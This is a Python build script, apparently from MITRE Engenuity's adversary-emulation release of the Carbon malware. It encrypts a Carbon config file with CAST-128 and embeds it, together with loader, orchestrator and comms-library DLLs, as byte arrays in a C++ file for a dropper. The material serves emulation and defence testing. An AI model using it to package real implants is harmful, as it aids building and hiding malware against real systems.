 # ---------------------------------------------------------------------------
 # add_resources.py - Encrypts Carbon dropper resources and places them in a C++ header file.

 # Copyright 2023 MITRE Engenuity. Approved for public release. Document number CT0005.
 # Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

 # http://www.apache.org/licenses/LICENSE-2.0

 # Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

 # This project makes use of ATT&CK®
 # ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 
 
 # Usage (run from the Dropper directory): 
 # python3 add_resources.py --config-path path/to/config/file --loader-path path/to/loader/dll --orchestrator-path path/to/orchestrator/dll --commslib-path path/to/commslib/dll -o src/components.cpp -k [key hex string] -l DEBUG
 
 # Revision History:
 
 # --------------------------------------------------------------------------- 

import argparse
import os
import logging

from Crypto.Cipher import CAST
from Crypto.Util.Padding import pad

RESOURCE_FILE_HEADER = r'''
/* 
 * Auto-generated resource file to satisfy file_handler.h
 */
 
#include <file_handler.h>

namespace file_handler {

'''

RESOURCE_FILE_TRAILER = r'''

} // namespace file_handler
'''

DATA_PREFIX_TEMPLATE = 'const unsigned char {}[] = {{'
DATA_SUFFIX = '};\n'

SIZE_TEMPLATE = 'const std::streamsize {} = {};\n'

CONFIG_DATA_NAME = 'kConfigFileData'
LOADER_DATA_NAME = 'kLoaderDllData'
ORCH_DATA_NAME = 'kOrchestratorDllData'
COMMS_DATA_NAME = 'kCommsDllData'

CONFIG_LEN_NAME = 'kConfigFileDataLen'
LOADER_LEN_NAME = 'kLoaderDllDataLen'
ORCH_LEN_NAME = 'kOrchestratorDllDataLen'
COMMS_LEN_NAME = 'kCommsDllDataLen'

BLOCK_SIZE = 8

# Generate random 8-byte IV and encrypt plaintext, returning the IV + ciphertext.
def cast128_encrypt(key, plaintext):
    iv = os.urandom(BLOCK_SIZE)
    
    cipher = CAST.new(key, CAST.MODE_CBC, iv=iv)
    ciphertext = cipher.encrypt(pad(plaintext, BLOCK_SIZE))
    return iv + ciphertext


# return resource data in string format "0x12, 0x34, 0x56, ..." as well as data length
def get_resource_data_info(resource_path, encryption_key=None):
    logging.info('Pulling resource data from %s', resource_path)
    with open(resource_path, 'rb') as resource_file:
        data = resource_file.read()
    data_len = len(data)
    logging.debug('Pulled %d bytes', data_len)
    if encryption_key:
        logging.info('Encrypting %s', resource_path)
        data = cast128_encrypt(encryption_key, data)
        data_len = len(data)
        logging.debug('Generated ciphertext of %d bytes', data_len)
    return (', '.join([hex(a) for a in data]), data_len)
    

def generate_output_file(config_path, loader_path, orch_path, comms_path, output_path, encryption_key):
    config_data_str, config_data_len = get_resource_data_info(config_path, encryption_key)
    loader_data_str, loader_data_len = get_resource_data_info(loader_path)
    orch_data_str, orch_data_len = get_resource_data_info(orch_path)
    comms_data_str, comms_data_len = get_resource_data_info(comms_path)
    
    if not config_data_str:
        logging.error('Failed to read in config file data')
        exit(1)
    elif not loader_data_str:
        logging.error('Failed to read in loader DLL data')
        exit(1)
    elif not orch_data_str:
        logging.error('Failed to read in orchestrator DLL data')
        exit(1)
    elif not comms_data_str:
        logging.error('Failed to read in comms library DLL data')
        exit(1)
        
    logging.info('Writing resource file at %s', output_path)
    with open(output_path, 'w') as output_file:
        output_file.write(RESOURCE_FILE_HEADER);
        
        # Config file data
        output_file.write(DATA_PREFIX_TEMPLATE.format(CONFIG_DATA_NAME))
        output_file.write(config_data_str)
        output_file.write(DATA_SUFFIX)
        output_file.write(SIZE_TEMPLATE.format(CONFIG_LEN_NAME, str(config_data_len)))
        
        # Loader data
        output_file.write(DATA_PREFIX_TEMPLATE.format(LOADER_DATA_NAME))
        output_file.write(loader_data_str)
        output_file.write(DATA_SUFFIX)
        output_file.write(SIZE_TEMPLATE.format(LOADER_LEN_NAME, str(loader_data_len)))
        
        # Orchestrator data
        output_file.write(DATA_PREFIX_TEMPLATE.format(ORCH_DATA_NAME))
        output_file.write(orch_data_str)
        output_file.write(DATA_SUFFIX)
        output_file.write(SIZE_TEMPLATE.format(ORCH_LEN_NAME, str(orch_data_len)))
        
        # Comms lib data
        output_file.write(DATA_PREFIX_TEMPLATE.format(COMMS_DATA_NAME))
        output_file.write(comms_data_str)
        output_file.write(DATA_SUFFIX)
        output_file.write(SIZE_TEMPLATE.format(COMMS_LEN_NAME, str(comms_data_len)))
        
        output_file.write(RESOURCE_FILE_TRAILER);
        
    logging.info('Finished')


if __name__ == '__main__':
    parser = argparse.ArgumentParser('Resource File Generator')
    parser.add_argument('--config-path', required=True, help='Provide path to the Carbon config file resource.')
    parser.add_argument('--loader-path', required=True, help='Provide path to the Carbon loader DLL resource.')
    parser.add_argument('--orchestrator-path', required=True, help='Provide path to the Carbon orchestrator DLL resource.')
    parser.add_argument('--commslib-path', required=True, help='Provide path to the Carbon comms library DLL resource.')
    parser.add_argument('-o', '--output', required=True, help='Provide output path for generated C++ file.')
    parser.add_argument('-k', '--key', required=True, help='16-byte CAST-128 encryption key for config file. Must be a hex string')
    parser.add_argument('-l', '--log', dest='logLevel', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], help='Set logging level', default='INFO')
    args = parser.parse_args()
    
    logging.basicConfig(level=getattr(logging, args.logLevel))
    logging.info('Output path set to %s', args.output)
    logging.info('Using encryption key %s', args.key)
    
    if args.key:
        key = bytes.fromhex(args.key)
        if len(key) == 16: 
            generate_output_file(args.config_path, args.loader_path, args.orchestrator_path, args.commslib_path, args.output, key)
            exit(0)
    logging.error('Invalid key provided. Please provide 16-byte key.')
    exit(1)
    
    
